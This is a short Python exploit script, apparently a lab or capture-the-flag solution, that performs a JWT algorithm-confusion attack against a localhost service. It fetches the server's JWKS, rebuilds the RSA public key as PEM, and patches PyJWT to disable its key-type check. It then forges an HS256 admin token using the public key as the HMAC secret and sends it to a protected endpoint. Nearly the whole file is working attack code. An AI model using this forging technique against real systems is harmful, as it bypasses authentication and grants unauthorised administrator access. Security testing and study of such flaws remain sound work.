import requests
import jwt
from jwt.algorithms import get_default_algorithms
import base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization


JWKS_URL = "http://localhost/.well-known/jwks.json"
TARGET_URL = "http://localhost/protected"


def jwk_to_pem(jwk):
    # Decode modulus and exponent
    n = int.from_bytes(base64.urlsafe_b64decode(jwk["n"] + "=="), "big")
    e = int.from_bytes(base64.urlsafe_b64decode(jwk["e"] + "=="), "big")

    # Reconstruct RSA public key
    public_numbers = rsa.RSAPublicNumbers(e, n)
    public_key = public_numbers.public_key()

    # Export to PEM (same as server's public.pem)
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return pem


print("[+] Fetching JWKS")
jwks = requests.get(JWKS_URL).json()
jwk = jwks["keys"][0]

print("[+] Reconstructing PEM public key from JWKS")
secret = jwk_to_pem(jwk)   # THIS is the HS256 secret


payload = {
    "id": 0,
    "username": "admin",
    "role": "admin"
}


# Disable PyJWT key-type check
alg = get_default_algorithms()["HS256"]
alg.prepare_key = lambda key: key

jwt.unregister_algorithm("HS256")
jwt.register_algorithm("HS256", alg)

print("[+] Forging HS256 token using reconstructed PEM as secret")
token = jwt.encode(payload, secret, algorithm="HS256")

print("\n[+] Forged Token:\n", token)

print(f"[+] Sending to {TARGET_URL}")
res = requests.get(
    TARGET_URL,
    headers={"Authorization": f"Bearer {token}"}
)

print("\nResponse:", res.status_code, res.text)
